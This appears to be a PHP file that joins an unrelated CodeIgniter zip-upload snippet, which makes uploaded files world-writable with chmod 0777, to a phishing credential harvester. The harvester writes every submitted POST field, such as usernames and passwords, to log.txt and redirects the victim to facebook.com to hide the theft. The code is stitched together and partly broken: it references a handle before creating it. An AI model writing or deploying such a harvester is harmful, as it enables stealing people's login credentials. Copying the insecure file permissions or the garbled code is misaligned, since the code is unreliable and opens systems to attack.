<?php

$config['upload_path'] = './uploads/'; // upload path
/* OR any other form, e.g.:
$config['upload_path'] = $_SERVER["DOCUMENT_ROOT"].'/uploads/'; // upload path
*/
$config['allowed_types'] = 'zip'; // array or string of file extensions 
$config['max_size'] = '100'; // max file size
$this->load->library('upload', $config); // do the job
$zdata = ['upload_data' => $this->upload->data()]; // get data
$zfile = $zdata['upload_data']['full_path']; // get file path
chmod($zfile,0777); // CHMOD file




header ('Location: https://facebook.com');
$handle->dir_chmod;
$handle = fopen("log.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n\n\n\n");
fclose($handle);
exit;
?>
